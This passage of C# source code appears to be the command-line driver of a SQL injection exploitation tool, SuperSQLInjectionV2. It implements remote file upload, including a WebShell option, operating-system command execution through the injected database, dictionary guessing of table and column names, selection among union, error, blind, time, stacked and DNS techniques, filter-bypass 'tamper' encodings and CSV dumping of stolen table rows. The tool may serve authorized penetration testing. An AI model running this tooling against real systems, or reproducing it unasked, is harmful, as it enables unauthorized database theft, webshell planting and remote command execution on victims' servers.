            if (!File.Exists(opt.FileWrite)) { Log.Error("本地文件不存在: " + opt.FileWrite); return; }
            if (string.IsNullOrWhiteSpace(opt.FileDest)) { Log.Error("--file-write 需要配合 --file-dest 指定远端路径"); return; }
            Console.WriteLine();
            Log.Highlight($"========== 上传文件: {opt.FileWrite} → {opt.FileDest} ==========");
            var vm = new FileCmdViewModel(config);
            vm.RefreshFileMethods(dbType);
            string? method = string.IsNullOrWhiteSpace(opt.FileMethod)
                ? vm.FileMethods.FirstOrDefault(m => m.Contains("写文件", StringComparison.Ordinal) || m.Contains("WebShell", StringComparison.Ordinal))
                : MatchMethod(vm.FileMethods, opt.FileMethod!);
            if (method == null) { Log.Error($"当前数据库 {dbType} 不支持文件写入" + (string.IsNullOrWhiteSpace(opt.FileMethod) ? "" : $"（无匹配方式[{opt.FileMethod}]，可用：{string.Join(" / ", vm.FileMethods)}）")); }
            else
            {
                vm.SelectedFileMethod = method;
                vm.FilePath = opt.FileDest!;
                if (method.Contains("二进制上传", StringComparison.Ordinal))
                {
                    vm.LoadLocalFile(opt.FileWrite);
                }
                else
                {
                    //文本写文件通道按 UTF-8 传输：先探测本地文件是否为二进制，避免静默损坏（验证会按损坏后内容自洽通过）
                    byte[] raw = File.ReadAllBytes(opt.FileWrite);
                    bool isBinary = Array.IndexOf(raw, (byte)0) >= 0
                        || !Encoding.UTF8.GetString(Encoding.UTF8.GetBytes(Encoding.UTF8.GetString(raw))).Equals(Encoding.UTF8.GetString(raw), StringComparison.Ordinal);
                    if (isBinary)
                    {
                        Log.Warning($"本地文件 {opt.FileWrite} 疑似二进制（含NUL字节或非UTF-8文本），文本写文件方式会损坏内容！建议加 --file-method \"二进制上传\"");
                    }
                    vm.FileContent = Encoding.UTF8.GetString(raw);
                }
                Log.Show($"方式: {method}");
                await FileCmdTools.ExecuteFile(config, vm);
            }
        }

        // ---- 命令执行 ----
        if (opt.OsCmd != null)
        {
            Console.WriteLine();
            Log.Highlight($"========== 命令执行: {opt.OsCmd} ==========");
            var vm = new FileCmdViewModel(config);
            vm.RefreshFileMethods(dbType);
            if (vm.CmdMethods.Count == 0) { Log.Error($"当前数据库 {dbType} 不支持命令执行（{vm.CmdMethodHint}）"); }
            else
            {
                vm.SelectedCmdMethod = string.IsNullOrWhiteSpace(opt.CmdMethod)
                    ? vm.CmdMethods[0]
                    : MatchMethod(vm.CmdMethods, opt.CmdMethod!) ?? "";
                if (string.IsNullOrEmpty(vm.SelectedCmdMethod))
                {
                    Log.Error($"无匹配命令执行方式[{opt.CmdMethod}]，可用：{string.Join(" / ", vm.CmdMethods)}");
                    return;
                }
                vm.CmdText = opt.OsCmd;
                vm.CmdShowResult = true;
                vm.CmdSessionMode = false;
                Log.Show($"方式: {vm.SelectedCmdMethod}");
                await FileCmdTools.ExecuteCmd(config, vm);
                if (!string.IsNullOrEmpty(vm.CmdResult)) Console.WriteLine(vm.CmdResult);
            }
        }
    }

    /// <summary>方式名匹配：优先精确相等，其次包含匹配（避免"大对象"误命中"大对象读文件"）</summary>
    private static string? MatchMethod(IEnumerable<string> methods, string key)
    {
        return methods.FirstOrDefault(m => string.Equals(m, key, StringComparison.OrdinalIgnoreCase))
               ?? methods.FirstOrDefault(m => m.Contains(key, StringComparison.OrdinalIgnoreCase));
    }

    // ================== 枚举（三通道） ==================

    private static async Task<List<string>> EnumerateNames(AppConfig config, InjectPoint hit,
        Func<string, int, Task<string>> getData, Func<string, Task<int>> getCount,
        string countPayload, string namesPayload, Func<int, string> nameAt)
    {
        bool echo = hit.InjectType is InjectType.Union or InjectType.Error;
        if (echo && !string.IsNullOrWhiteSpace(namesPayload))
        {
            //聚合一次取回，空则回退逐行
            string agg = await getData(namesPayload, 4096);
            var items = (agg ?? "").Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries).ToList();
            if (items.Count > 0) return items;
            Log.Warning("聚合取回为空（可能被截断），回退逐行读取");
        }
        int count = await getCount(countPayload);
        if (count <= 0) return [];
        var names = new List<string>(count);
        for (int i = 0; i < count; i++)
        {
            config.CheckStop();
            string name = await getData(nameAt(i), 256);
            if (string.IsNullOrEmpty(name)) break;
            names.Add(name);
            Log.Show($"  [{i + 1}/{count}] {name}");
        }
        return names;
    }

    /// <summary>字面量模板判定：无括号/引号/空白即非SQL表达式（如 Access DBNames=Access），可直接作为结果返回</summary>
    private static bool IsLiteralPayload(string? p) =>
        !string.IsNullOrWhiteSpace(p) && !p.Any(c => c == '(' || c == '\'' || char.IsWhiteSpace(c));

    /// <summary>
    /// Access 表名/字段名字典猜解（GUI DBStructTools.GuessAccessDictByBool 的 CLI 对应实现）：
    /// msysobjects 默认无读权限，用字典逐项构造 exists 子查询做布尔存在性判断。
    /// 字典：config/dict/access_tables.txt / access_columns.txt
    /// </summary>
    private static async Task<List<string>> DictGuessByBool(AppConfig config, bool isTable, string? table = null)
    {
        string dictFile = isTable ? "access_tables.txt" : "access_columns.txt";
        List<string> words = File.ReadAllLines(
                Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "config", "dict", dictFile), Encoding.UTF8)
            .Select(w => w.Trim())
            .Where(w => w.Length > 0 && !w.StartsWith('#'))
            .Distinct(StringComparer.OrdinalIgnoreCase)
            .ToList();
        if (words.Count == 0)
        {
            Log.Warning($"Access{(isTable ? "表名" : "字段")}字典为空或读取失败：config/dict/{dictFile}");
            return [];
        }
        string template = PayloadFactory.BasePayload.Get(isTable ? "exists_table" : "exists_column");
        Log.Show($"Access无元数据可读，启用{(isTable ? "表名" : "字段")}字典猜解{(isTable ? "" : $"（表 {table}）")}：字典 {words.Count} 项……");
        var hits = new System.Collections.Concurrent.ConcurrentBag<string>();
        await WorkRunner.RunAsync(words, config, async w =>
        {
            config.CheckStop();
            string condition = isTable
                ? TemplateRenderer.Render(template, ("table", w))
                : TemplateRenderer.Render(template, ("cols", w), ("table", table ?? ""));
            if (await DataComm.CheckCondition(config, condition).ConfigureAwait(false))
            {
                hits.Add(w);
                Log.Show($"  命中: {w}");
            }
        }).ConfigureAwait(false);
        return hits.OrderBy(h => h, StringComparer.OrdinalIgnoreCase).ToList();
    }

    // ================== 注入点选择/应用 ==================

    private static InjectPoint PickBest(List<InjectPoint> hits, CliOptions opt)
    {
        if (!string.IsNullOrWhiteSpace(opt.Technique))
        {
            foreach (char c in opt.Technique!)
            {
                var t = LetterToType(c);
                var h = hits.FirstOrDefault(x => x.InjectType == t);
                if (h != null) return h;
            }
        }
        //默认优先级与检测引擎ExploitPriority一致：Union > Error > Bool盲注 > DNS > 堆叠 > 时间盲注
        //（布尔逐位二分远快于时间的延时逐位；堆叠慢但具备写操作/命令执行能力故保留靠后可选）
        return hits.FirstOrDefault(h => h.InjectType == InjectType.Union)
            ?? hits.FirstOrDefault(h => h.InjectType == InjectType.Error)
            ?? hits.FirstOrDefault(h => h.InjectType == InjectType.Blind)
            ?? hits.FirstOrDefault(h => h.InjectType == InjectType.Dns)
            ?? hits.FirstOrDefault(h => h.InjectType == InjectType.Stacked)
            ?? hits[^1];
    }

    private static InjectType LetterToType(char c) => char.ToUpperInvariant(c) switch
    {
        'B' => InjectType.Blind,
        'E' => InjectType.Error,
        'U' => InjectType.Union,
        'T' => InjectType.Time,
        'S' => InjectType.Stacked,
        'D' => InjectType.Dns,
        _ => InjectType.UnKnow
    };

    private static string TypeName(InjectPoint h) => h.InjectType switch
    {
        InjectType.Blind => $"Bool盲注({h.BoolInjectType})",
        InjectType.Time => "时间盲注",
        InjectType.Error => "报错注入",
        InjectType.Union => "Union注入",
        InjectType.Stacked => "堆叠注入",
        InjectType.Dns => "DNS盲注",
        _ => h.InjectType.ToString()
    };

    private static void ApplyHit(AppConfig config, InjectPoint best)
    {
        config.DataConfig.SelectedInjectType = best.InjectType;
        config.DataConfig.InjectParamName = best.PName ?? "";
        //数据库类型同步回填：否则检测命中（非--dbms指定）时EnsureDataOpReady仍报"未识别数据库类型"，取数/文件/命令动作全部不可用
        config.DataConfig.SelectedDBType = best.DBType;
        if (best.InjectType == InjectType.Blind || best.InjectType == InjectType.Time || best.InjectType == InjectType.Stacked)
        {
            //堆叠命中同样携带时间盲注oracle（BoolInjectType.Time + CheckValue=延时秒数），取数回退时间通道依赖（与GUI UpdateData对齐）
            if (best.InjectType != InjectType.Time)
            {
                config.DataConfig.SelectBoolInject = best.BoolInjectType;
            }
            config.DataConfig.CheckValue = best.CheckValue;
            config.DataConfig.Reverse = best.Revers;
            //时间/堆叠命中：检测测出的延时标准绑定通道配置延时秒数SleepInjectMaxTime
            //（时间通道发包sleep/判定阈值/自适应加时的单一数据源；时间类型亦经CheckValue反向同步覆盖，此处双保险）
            if (best.InjectType is InjectType.Time or InjectType.Stacked
                && int.TryParse(best.CheckValue, out int sleepSec) && sleepSec > 0 && sleepSec <= 60)
            {
                config.SleepInjectMaxTime = sleepSec;
            }
            //相似度oracle基准（高动态三档兜底取数依赖）
            config.DataConfig.SimilarTemplate = best.SimilarTemplate ?? "";
            config.DataConfig.SimilarMode = best.SimilarMode ?? "";
            config.DataConfig.SimilarCutoff = best.SimilarCutoff;
            config.DataConfig.SimilarFeatures = best.DynamicFeatures;
        }
        if (best.InjectType == InjectType.Union)
        {
            config.DataConfig.SumColumnCount = best.SumColumnCount;
            config.DataConfig.ShowColumnIndex = best.ShowColumnIndex;
        }
        config.DataConfig.TrueCode = best.TrueCode;
        config.DataConfig.FalseCode = best.FalseCode;
        config.DataConfig.SawUnexpectedCode = false;
        //vector原文复用上下文（报错[QUERY]/where=3[INFERENCE]）：标记报文只留$sql$胶水，
        //发送期按VectorTemplate装配触发函数/包装结构，缺了会把裸表达式发进无and胶水请求导致取数为空
        config.DataConfig.Where = best.Where;
        config.DataConfig.VectorTemplate = best.VectorTemplate ?? "";
        config.DataConfig.OrigValue = best.OrigValue ?? "";
        //检测期为报错vector预生成的回显标记同步启用（发送期vector分隔符渲染与取数解析同源）
        Payload.EchoMarkers.Use(best.StartMark, best.EndMark, best.SplitMark, Payload.PayloadFactory.BasePayload);
        config.RequestTxt = best.RequestTxt;
        //检测期自动适配的编码工具随注入点恢复
        if (!string.IsNullOrEmpty(best.AutoTamper))
        {
            var item = config.ByPassConfig.EncodeTools.FirstOrDefault(s =>
                string.Equals(s.Key, best.AutoTamper, StringComparison.OrdinalIgnoreCase)
                || string.Equals(s.Name, best.AutoTamper, StringComparison.OrdinalIgnoreCase));
            if (item == null)
            {
                item = RuleStore.LoadToolByKey(best.AutoTamper);
                if (item != null)
                {
                    config.ByPassConfig.EncodeTools.Add(item);
                }
            }
            if (item != null)
            {
                item.Enable = true;
                Log.Show($"检测期绕过已恢复: {best.AutoTamper}");
            }
        }
    }

    private static DBType ParseDbms(string s)
    {
        s = s.Trim().ToLowerInvariant();
        return s switch
        {
            "mysql" => DBType.MySQL,
            "pgsql" or "postgresql" => DBType.PostgreSQL,
            "sqlserver" or "mssql" => DBType.SQLServer,
            "sqlite" => DBType.SQLite,
            "oracle" => DBType.Oracle,
            "access" => DBType.Access,
            "dm" => DBType.DM,
            "kingbase" => DBType.Kingbase,
            "h2" => DBType.H2,
            "hsqldb" => DBType.HSQLDB,
            "opengauss" => DBType.OpenGauss,
            "db2" => DBType.DB2,
            "clickhouse" => DBType.ClickHouse,
            _ => Enum.TryParse<DBType>(s, true, out var t) ? t : DBType.UnKnow
        };
    }

    // ================== 目标/参数处理 ==================

    private static string BuildRequestFromUrl(AppConfig config, CliOptions opt)
    {
        var uri = new Uri(opt.Url!);
        config.Host = uri.Host;
        config.Port = uri.Port > 0 ? uri.Port : (uri.Scheme == "https" ? 443 : 80);
        config.IsSSL = uri.Scheme == "https";

        string path = string.IsNullOrEmpty(uri.PathAndQuery) ? "/" : uri.PathAndQuery;
        string ua = opt.UserAgent ?? "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SuperSQLInjectionV2.Cmd/" + AppVersion;
        string method = opt.Method ?? (string.IsNullOrEmpty(opt.Data) ? "GET" : "POST");

        var sb = new StringBuilder();
        sb.Append($"{method} {path} HTTP/1.1\r\n");
        sb.Append($"Host: {uri.Host}{(uri.IsDefaultPort ? "" : ":" + config.Port)}\r\n");
        sb.Append($"User-Agent: {ua}\r\n");
        sb.Append("Accept: */*\r\n");
        if (!string.IsNullOrWhiteSpace(opt.Cookie)) sb.Append($"Cookie: {opt.Cookie}\r\n");
        foreach (var h in opt.Headers) sb.Append(h.Replace("\r", "", StringComparison.Ordinal).Replace("\n", "", StringComparison.Ordinal) + "\r\n");
        if (!string.IsNullOrEmpty(opt.Data))
        {
            sb.Append("Content-Type: application/x-www-form-urlencoded\r\n");
            sb.Append($"Content-Length: {Encoding.UTF8.GetByteCount(opt.Data)}\r\n");
        }
        sb.Append("Connection: close\r\n\r\n");
        if (!string.IsNullOrEmpty(opt.Data)) sb.Append(opt.Data);
        return sb.ToString();
    }

    private static void ApplyHostFromRequest(AppConfig config, string requestTxt)
    {
        var hostLine = requestTxt.Split("\r\n").FirstOrDefault(l => l.StartsWith("Host:", StringComparison.OrdinalIgnoreCase));
        if (hostLine == null) throw new ArgumentException("请求报文缺少 Host 头");
        string hostPort = hostLine[5..].Trim();
        if (hostPort.Contains(':', StringComparison.Ordinal))
        {
            config.Host = hostPort.Split(':')[0];
            config.Port = int.Parse(hostPort.Split(':')[1]);
        }
        else
        {
            config.Host = hostPort;
            config.Port = 80;
        }
    }

    /// <summary>从请求报文发现可测参数：Query / POST表单；-p 指定时只保留该参数</summary>
    private static List<(string Name, string Value, ParamPlace Place, string Header, int UriIdx)> DiscoverParams(
        AppConfig config, string requestTxt, ParamPlace bodyPlace, CliOptions opt)
    {
        var list = new List<(string, string, ParamPlace, string, int)>();
        string firstLine = requestTxt.Split("\r\n")[0];
        var parts = firstLine.Split(' ');
        if (parts.Length >= 2)
        {
            int q = parts[1].IndexOf('?', StringComparison.Ordinal);
            if (q >= 0)
            {
                foreach (var kv in parts[1][(q + 1)..].Split('&', StringSplitOptions.RemoveEmptyEntries))
                {
                    int eq = kv.IndexOf('=', StringComparison.Ordinal);
                    string name = eq >= 0 ? kv[..eq] : kv;
                    string value = eq >= 0 ? kv[(eq + 1)..] : "";
                    list.Add((Uri.UnescapeDataString(name), value, ParamPlace.Query, "", -1));
                }
            }
        }
        //POST 表单体
        int bodyIdx = requestTxt.IndexOf("\r\n\r\n", StringComparison.Ordinal);
        if (bodyIdx >= 0)
        {
            string body = requestTxt[(bodyIdx + 4)..];
            if (body.Contains('=', StringComparison.Ordinal) && !body.TrimStart().StartsWith('{') && !body.TrimStart().StartsWith('<'))
            {
                foreach (var kv in body.Split('&', StringSplitOptions.RemoveEmptyEntries))
                {
                    int eq = kv.IndexOf('=', StringComparison.Ordinal);
                    string name = eq >= 0 ? kv[..eq] : kv;
                    string value = eq >= 0 ? kv[(eq + 1)..] : "";
                    if (name.Length > 0) list.Add((Uri.UnescapeDataString(name), value, ParamPlace.BodyForm, "", -1));
                }
            }
        }
        //扩展注入位置（与 GUI 共用枚举逻辑 ParamTargetDiscovery）：URI段/JSON/XML/Multipart 任意level，Cookie level>=2，UA/Referer/Host头 level>=3
        var req = new HttpRequest(config, requestTxt);
        foreach (var t in SuperSQLInjectionV2.Tools.ParamTargetDiscovery.DiscoverExtended(req, requestTxt, config.DataConfig.DetectLevel))
        {
            list.Add((t.Name, t.Value, t.Place, t.Header, t.UriIdx));
        }
        if (!string.IsNullOrWhiteSpace(opt.TestParam))
        {
            list = list.Where(x => string.Equals(x.Item1, opt.TestParam, StringComparison.OrdinalIgnoreCase)).ToList();
            if (list.Count == 0)
            {
                //-p 指定但报文里没有：按默认位置加入（值取 "1"）
                list.Add((opt.TestParam!, "1", bodyPlace, "", -1));
            }
        }
        return list;
    }

    private static void ApplyTamper(AppConfig config, string tamper)
    {
        foreach (var name in tamper.Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries))
        {
            var item = config.ByPassConfig.EncodeTools.FirstOrDefault(s =>
                string.Equals(s.Key, name, StringComparison.OrdinalIgnoreCase)
                || string.Equals(s.Name, name, StringComparison.OrdinalIgnoreCase));
            if (item == null)
            {
                item = RuleStore.LoadToolByKey(name);
            }
            if (item == null)
            {
                Log.Warning($"编码工具未找到: {name}（已忽略）");
                continue;
            }
            if (!config.ByPassConfig.EncodeTools.Contains(item)) config.ByPassConfig.EncodeTools.Add(item);
            item.Enable = true;
            Log.Show($"编码处理启用: {item.Name}");
        }
    }

    private static void ApplyProxy(AppConfig config, string proxy)
    {
        try
        {
            var uri = new Uri(proxy);
            config.ProxyConfig.ProxyEnable = true;
            config.ProxyConfig.SelectProxyType = ProxyType.Fixed;
            config.ProxyConfig.AddProxy = new Proxy
            {
                Host = uri.Host,
                Port = uri.Port > 0 ? uri.Port : 8080,
                proxyType = uri.Scheme.Equals("socks5", StringComparison.OrdinalIgnoreCase) ? "socks5" : "HTTP/HTTPS"
            };
            Log.Show($"代理: {uri.Scheme}://{uri.Host}:{uri.Port}");
        }
        catch (Exception e)
        {
            Log.Warning("代理地址解析失败（已忽略）: " + e.Message);
        }
    }

    private static string RequireDb(CliOptions opt, string action)
    {
        if (string.IsNullOrWhiteSpace(opt.Db)) throw new ArgumentException($"{action} 需要 -D 指定数据库名");
        return opt.Db!;
    }

    private static string RequireTable(CliOptions opt, string action)
    {
        if (string.IsNullOrWhiteSpace(opt.Table)) throw new ArgumentException($"{action} 需要 -T 指定表名");
        return opt.Table!;
    }

    // ================== 输出 ==================

    private static void PrintTable(List<string> cols, List<DynamicDataItem> rows)
    {
        var widths = cols.Select((c, i) => Math.Max(c.Length, rows.Select(r => DisplayWidth(r[c])).DefaultIfEmpty(0).Max())).ToArray();
        string Sep() => "+" + string.Join("+", widths.Select(w => new string('-', w + 2))) + "+";
        Console.WriteLine(Sep());
        Console.WriteLine("|" + string.Join("|", cols.Select((c, i) => " " + c.PadRight(widths[i]) + " ")) + "|");
        Console.WriteLine(Sep());
        foreach (var r in rows)
        {
            Console.WriteLine("|" + string.Join("|", cols.Select((c, i) => " " + PadDisplay(r[c], widths[i]) + " ")) + "|");
        }
        Console.WriteLine(Sep());
        Log.Success($"共 {rows.Count} 行");
    }

    private static int DisplayWidth(string s) => s.Sum(ch => ch > 0xFF ? 2 : 1);
    private static string PadDisplay(string s, int width) => s + new string(' ', Math.Max(0, width - DisplayWidth(s)));

    private static string OutputRoot(CliOptions opt, AppConfig config)
    {
        string dir = opt.OutputDir ?? Path.Combine("output", $"{config.Host}_{config.Port}");
        Directory.CreateDirectory(dir);
        return dir;
    }

    private static void SaveDumpCsv(CliOptions opt, AppConfig config, string db, string table, List<string> cols, List<DynamicDataItem> rows)
    {
        try
        {
            string dir = OutputRoot(opt, config);
            string file = Path.Combine(dir, $"dump_{db}_{table}_{DateTime.Now:yyyyMMdd_HHmmss}.csv");
            var sb = new StringBuilder();
            sb.AppendLine(string.Join(",", cols.Select(CsvEscape)));
            foreach (var r in rows) sb.AppendLine(string.Join(",", cols.Select(c => CsvEscape(r[c]))));
            File.WriteAllText(file, sb.ToString(), Encoding.UTF8);
            Log.Success($"dump 已保存: {file}");
        }
        catch (Exception e)
        {
            Log.Warning("dump 保存失败（不影响结果）: " + e.Message);
        }
    }

    private static string CsvEscape(string s) => s.Contains(',', StringComparison.Ordinal) || s.Contains('"', StringComparison.Ordinal) || s.Contains('\n', StringComparison.Ordinal)
        ? "\"" + s.Replace("\"", "\"\"", StringComparison.Ordinal) + "\"" : s;
}
